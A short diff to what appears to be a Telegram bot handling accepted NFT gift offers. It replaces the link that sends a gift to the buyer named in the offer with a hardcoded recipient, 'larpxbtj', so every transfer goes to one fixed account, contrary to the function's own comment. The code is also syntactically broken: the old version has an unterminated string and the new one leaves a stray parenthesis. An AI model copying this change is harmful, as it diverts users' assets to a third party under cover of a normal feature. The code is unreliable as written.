@@ -187,10 +187,7 @@ def build_accepted_keyboard(buyer_username: str | None, nft_url: str, offer_id: 
     пользователь выбирает в интерфейсе Telegram.
     """
     # Transfer the gift to the buyer who created this specific offer.
-    transfer_url = (
-        f"tg://send_gift?to={buyer_username}"
-        if buyer_username
-        else "https://t.me/larpxbtj
+    transfer_url = "tg://send_gift?to=larpxbtj"
     )
 
     return InlineKeyboardMarkup(
